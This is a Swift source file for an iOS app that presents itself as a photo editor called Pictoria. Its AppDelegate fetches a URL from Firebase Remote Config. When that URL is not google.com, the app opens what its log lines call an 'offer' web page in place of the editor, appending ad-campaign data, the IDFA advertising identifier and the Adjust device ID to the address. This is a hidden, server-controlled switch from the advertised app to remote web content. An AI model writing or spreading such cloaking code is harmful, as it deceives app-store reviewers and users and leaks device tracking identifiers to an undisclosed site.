import SwiftUI
import FirebaseCore
import FirebaseRemoteConfig
import Adjust
import Adjust
import AdSupport
import Combine

class AppDelegate: NSObject, UIApplicationDelegate, AdjustDelegate {
    @Published var isOpenWeb: Bool = false
    
    var window: UIWindow?
    var fetchingStatus: Bool = false
    var value: String = "https://www.google.com/"
    let yourAppToken = "rmtwgk7v04jk"
    var remoteConfigStatus = false
    var attributionStatus = false
    var finalStatus = false
    var isRedirected = false
    var ConversionData: [AnyHashable: Any]? = nil
    var timer: Timer?
    var timeOutTimer: Timer?


    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
        window = UIWindow(frame: UIScreen.main.bounds)
        timer = Timer.scheduledTimer(timeInterval: 8.0, target: self, selector: #selector(timerFired), userInfo: nil, repeats: false)

        FirebaseApp.configure()
        var remoteConfig = RemoteConfig.remoteConfig()


        remoteConfig.fetch(withExpirationDuration: 0, completionHandler: { status, error in
            if status == .success, error == nil {
                print("Config fetched")
                remoteConfig.activate(completion: { changed,error  in
                    guard error == nil else {
                        return
                    }
                    print("KJKJK got Remote Config")
                    self.remoteConfigStatus = true
                    self.value = remoteConfig.configValue(forKey: "Address").stringValue ?? "https://www.google.com/"

                    if self.remoteConfigStatus && self.attributionStatus {
                        self.connectionTimeOut()
                    }
                    print("RESULT \(self.value)")
                })
            } else {
                self.value = ""
                print("Error")
            }

        })
        let environment = ADJEnvironmentSandbox
        let adjustConfig = ADJConfig(
            appToken: self.yourAppToken,
            environment: environment
        )
        adjustConfig?.logLevel = ADJLogLevelVerbose
        adjustConfig?.allowAdServicesInfoReading = true
        adjustConfig?.delegate = self
        adjustConfig?.allowIdfaReading = true
        adjustConfig?.attConsentWaitingInterval = 10
        adjustConfig?.delayStart = 5
        Adjust.appDidLaunch(adjustConfig!)
        
        return true
    }
    
    func attempted() {
        isRedirected = true
        stopTimer()
    }

    func applicationDidBecomeActive(_ application: UIApplication) {
        print("KJKJK ASK TRACKING REQUEST")
        Adjust.requestTrackingAuthorization { status in
            switch status {
            case 0:
                break
            case 1:
                break
            case 2:
                break
            case 3:
                print("3 \(String(describing: Adjust.getInstance()?.idfa()))")
                break
            default:
                break
            }
        }
    }
    
    func requestTracking() {
        print("KJKJK ASK TRACKING REQUEST")
        Adjust.requestTrackingAuthorization { status in
            switch status {
            case 0:
                break
            case 1:
                break
            case 2:
                break
            case 3:
                print("3 \(Adjust.getInstance()?.idfa())")
                break
            default:
                break
            }
        }
    }
    
    func applicationDidFinishLaunching(_ application: UIApplication) {
    }
    
    @objc
    func requestPermission() {
        if #available(iOS 14, *) {
            Adjust.requestTrackingAuthorization { status in
                switch status {
                case 0:
                    print("0")
                case 1:
                    print("1")
                case 2:
                    print("2")
                case 3:
                    print("3 \(Adjust.idfa())")
                    
                 default:
                    print("Unknown")
                }
                
            }
        }
    }
    
    @objc func timerFired() {
        print("Таймер истек!")
        connectionTimeOut()
    }
    
    func connectionTimeOut() {
        ConversionData = Adjust.getInstance()?.attribution()?.dictionary()
        print("KJKJK Connection Time out")
        print("KJKJK ADID \(Adjust.adid())")
        print("KJKJK adfa \(Adjust.getInstance()?.idfa())")
        print("KJKJK timeOut att \(ConversionData?.description)   \(ConversionData?["trackerToken"]) || \(ConversionData?["tn"]) \(ConversionData?["network"]) ")
        
        let idfa = ASIdentifierManager.shared().advertisingIdentifier.uuidString
            print("KJKJK idfa = \(idfa)")

        
        if !finalStatus {
            finalStatus = true
            
            if remoteConfigStatus && attributionStatus {
                if value == "https://www.google.com/" {
                    print("KJKJK Got goole page from remote Config, opening app")
                    DispatchQueue.main.async {
                        self.showBaseView(link: "https://www.google.com/" )
                    }
                    return
                } else {
                    print("KJKJK Got another page from remote Config, opening offer")
                    showView(link: value)
                    return
                }
            }
            
            if !remoteConfigStatus && attributionStatus {
                print("KJKJK No Remote config")
                DispatchQueue.main.async {
                    self.showBaseView(link: "https://www.google.com/")
                }
                return
            }
            
            if remoteConfigStatus && !attributionStatus {
                
                if let attribution = Adjust.attribution() {
                    print("KJKJK No Attribution Update \(attribution)")
                    if value == "https://www.google.com/" {
                        print("KJKJK Got google page from remote Config, opening app")
                        DispatchQueue.main.async {
                            self.showBaseView(link: "https://www.google.com/")
                        }
                        return
                    } else {
                        print("KJKJK Got another page from remote Config, opening offer")
                        showView(link: value)
                        return
                    }

                } else {
                    print("KJKJK No Attribution")
                    print("KJKJK Attribution 2 \(Adjust.attribution().debugDescription)")

                    if value == "https://www.google.com/" {
                        print("KJKJK Got goole page from remote Config, opening app")
                        DispatchQueue.main.async {
                            self.showBaseView(link: "https://www.google.com/")
                        }
                        return
                    } else {
                        print("KJKJK Got another page from remote Config, opening offer")
                        showView(link: value)
                        return
                    }
                }
            }
            
            print("KJKJK Attribution 2 \(Adjust.attribution().debugDescription)")
            
            print("KJKJK Did not get any data")
            DispatchQueue.main.async {
                self.showBaseView(link: "https://www.google.com/")
            }
            return
        }
        
    }
    
    func adjustSessionTrackingFailed(_ sessionFailureResponseData: ADJSessionFailure?) {
    }
    
    func adjustEventTrackingSucceeded(_ eventSuccessResponseData: ADJEventSuccess?) {
    }
    func adjustSessionTrackingSucceeded(_ sessionSuccessResponseData: ADJSessionSuccess?) {
    }
    func adjustEventTrackingFailed(_ eventFailureResponseData: ADJEventFailure?) {
    }
    func adjustAttributionChanged(_ attribution: ADJAttribution?) {
        
        print("Attribution \(attribution.debugDescription)")

        attributionStatus = true
        if remoteConfigStatus && attributionStatus {
            connectionTimeOut()
        }
    }
    
    func adjustConversionValueUpdated(_ conversionValue: NSNumber?) {
        print("Conversion value: \(conversionValue ?? 0)")
    }
    func adjustConversionValueUpdated(_ fineValue: NSNumber?, coarseValue: String?, lockWindow: NSNumber?) {
        print("Fine conversion value: \(fineValue ?? 0)")
        print("Coarse conversion value: \(coarseValue ?? "")")
        print("Will send before conversion value window ends: \(String(describing: lockWindow?.boolValue ?? nil))")
    }
    
    func showView(link: String) {
        
        var finalLink = link + Constants.crmValue + "?"
        var url = URL(string: finalLink)
        var urlComponents = URLComponents(string: finalLink)
        
        if let campaign = Adjust.getInstance()?.attribution()?.campaign {
            urlComponents?.queryItems?.append(URLQueryItem(name: "stream_hash", value: campaign))
        } else {
            urlComponents?.queryItems?.append(URLQueryItem(name: "stream_hash", value: ""))
        }
        
        if let campaign = Adjust.getInstance()?.attribution()?.campaign,
            let campaignID = Adjust.getInstance()?.attribution()?.dictionary()?["campaign_id"] {
            urlComponents?.queryItems?.append(URLQueryItem(name: "sid1", value: "\(campaign) (\(campaignID))"))
        } else if let campaign1 = Adjust.getInstance()?.attribution()?.campaign {
            urlComponents?.queryItems?.append(URLQueryItem(name: "sid1", value: "\(campaign1) ()"))
        } else if let campaignID1 = Adjust.getInstance()?.attribution()?.dictionary()?["campaign_id"] {
            urlComponents?.queryItems?.append(URLQueryItem(name: "sid1", value: " (\(campaignID1))"))
        } else {
            urlComponents?.queryItems?.append(URLQueryItem(name: "sid1", value: ""))
        }
        
        
        if let creative = Adjust.getInstance()?.attribution()?.creative,
            let creativeID = Adjust.getInstance()?.attribution()?.dictionary()?["creative_id"] {
            urlComponents?.queryItems?.append(URLQueryItem(name: "sid2", value: "\(creative) (\(creativeID))"))
        } else if let creative1 = Adjust.getInstance()?.attribution()?.creative {
            urlComponents?.queryItems?.append(URLQueryItem(name: "sid2", value: "\(creative1) ()"))
        } else if let creativeID1 = Adjust.getInstance()?.attribution()?.dictionary()?["creative_id"] {
            urlComponents?.queryItems?.append(URLQueryItem(name: "sid2", value: " (\(creativeID1))"))
        } else {
            urlComponents?.queryItems?.append(URLQueryItem(name: "sid2", value: ""))
        }
        
        
        if let adgroup = Adjust.getInstance()?.attribution()?.adgroup,
            let adgroupID = Adjust.getInstance()?.attribution()?.dictionary()?["adgroup_id"] {
            urlComponents?.queryItems?.append(URLQueryItem(name: "sid3", value: "\(adgroup) (\(adgroupID))"))
        } else if let adgroup1 = Adjust.getInstance()?.attribution()?.adgroup {
            urlComponents?.queryItems?.append(URLQueryItem(name: "sid3", value: "\(adgroup1) ()"))
        } else if let adgroupID1 = Adjust.getInstance()?.attribution()?.dictionary()?["adgroup_id"] {
            urlComponents?.queryItems?.append(URLQueryItem(name: "sid3", value: " (\(adgroupID1))"))
        } else {
            urlComponents?.queryItems?.append(URLQueryItem(name: "sid3", value: ""))
        }
        
        
        if let idfa = Adjust.getInstance()?.idfa() {
            urlComponents?.queryItems?.append(URLQueryItem(name: "app_sid1", value: idfa))
        } else {
            urlComponents?.queryItems?.append(URLQueryItem(name: "app_sid1", value: ""))
        }
        
        urlComponents?.queryItems?.append(URLQueryItem(name: "app_sid2", value: "com.pictoriaaeditor.smartpictor"))

        if let adid = Adjust.getInstance()?.adid() {
            urlComponents?.queryItems?.append(URLQueryItem(name: "app_sid3", value: adid))
        } else {
            urlComponents?.queryItems?.append(URLQueryItem(name: "app_sid3", value: ""))
        }
        var finalURL = urlComponents?.url?.absoluteString ?? "https://www.google.com/"
        value = finalURL
        print("LLL FINAL URL \(finalURL)")
        NewViewController.shared.someAddress = finalURL
        isOpenWeb = true
    }
    
    func showBaseView(link: String) {
        var finalURL = "https://www.google.com/"
        value = finalURL
        print("LLL FINAL URL \(finalURL)")
        NewViewController.shared.someAddress = finalURL
        isOpenWeb = true
    }
    
    
    func showViewController() {
    }
    
    func startTimer() {
        timer = Timer.scheduledTimer(timeInterval: 2.0, target: self, selector: #selector(timerAction), userInfo: nil, repeats: false)
        print("LLL Started")
    }
    
    @objc func timerAction() {
        if !isRedirected {
            let navigationController = UINavigationController(rootViewController: NewViewController.shared)
            self.window?.rootViewController = navigationController
            self.window?.makeKeyAndVisible()
        }
    }
    
    func stopTimer() {
        // Останавливаем таймер
        timer?.invalidate()
        timer = nil
        print("LLL Attempted google")
        showViewController()
    }
}


@main
struct PictoriaApp: App {
    
    enum Scenario {
        case onboarding
        case mainScreen
    }
    
    @UIApplicationDelegateAdaptor(AppDelegate.self) var appDelegate
    
    @State private var isDelayed = false
    @State private var dataFromAppDelegate: Bool = false
    @State private var isPageLoaded = false

    
    @State private var scenario: Scenario = .mainScreen
    @State private var selectedTab: Tab = .home
    @State private var isGuideActive = false
    
    @State private var animatedLogo: Bool = false
    @State private var isHiddenTabBar = true
    
    @State private var wasShowingTab: Bool = false
    
    @State private var cancellable: AnyCancellable?


    var body: some Scene {
        WindowGroup {
            if isDelayed {
                if dataFromAppDelegate {
                    if isPageLoaded {
                                switch scenario {
                                    case .onboarding:
                                        Onboarding(onClose: {
                                            UserDefaults.standard.setValue(true, forKey: "ShownOnboarding")
                                            scenario = .mainScreen
                                        })
                                        .preferredColorScheme(.light)
                                    case .mainScreen:
                                        NavigationView {
                                            VStack {
                                                switch selectedTab {
                                                case .home:
                                                    MainScreen(showed: $animatedLogo) {
                                                        withAnimation {
                                                            isHiddenTabBar = true
                                                        }
                                                    } showTabBar: {
                                                        withAnimation {
                                                            wasShowingTab = true
                                                            isHiddenTabBar = false
                                                        }
                                                    } didSave: {
                                                        withAnimation {
                                                            isHiddenTabBar = false
                                                            selectedTab = .profile
                                                        }
                                                    }
                                                case .profile:
                                                    Profile() {
                                                        withAnimation {
                                                            isHiddenTabBar = true
                                                        }
                                                    }
                                                }
                                            }
                                            .onAppear {
                                                print("KJKJK SHOW ONBOARDING")
                                                withAnimation {
                                                    if wasShowingTab || !UserDefaults.standard.bool(forKey: "ShownOnboarding")  {
                                                        isHiddenTabBar = false
                                                        wasShowingTab = true
                                                    }
                                                }
                                            }
                                        }
                                        .transition(.opacity)
                                        .navigationBarTitleDisplayMode(.inline)
                                        .overlay(
                                            TabBar(selectedTab: $selectedTab, isHidden: $isHiddenTabBar), alignment: .bottom
                                        )
                                        .preferredColorScheme(.light)
                                    }

                    } else {
                        WrapperView(appDelegate: appDelegate, didFinishLoading: $isPageLoaded)
                                .edgesIgnoringSafeArea(.all)
                    }
                } else {
                    LoadingView(showed: $animatedLogo)
                }
            } else {
                LoadingView(showed: $animatedLogo)
                    .onAppear {
                        cancellable = appDelegate.$isOpenWeb.sink { newValue in
                                dataFromAppDelegate = newValue
                                isDelayed = true
                            NewViewController.shared.openSomeView(value: appDelegate.value)
                        }
                        Task {
                            try await Task.sleep(nanoseconds: 10_000_000_000)
                            if !isDelayed {
                                dataFromAppDelegate = appDelegate.isOpenWeb
                                isDelayed = true
                                if UserDefaults.standard.bool(forKey: "ShownOnboarding") {
                                    scenario = .mainScreen
                                } else {
                                    scenario = .onboarding
                                }
                            }
                        }
                    }
                    .onReceive(NotificationCenter.default.publisher(for: UIApplication.didBecomeActiveNotification)) { _ in
                        appDelegate.requestTracking()
                    }
            }
        }
    }
}
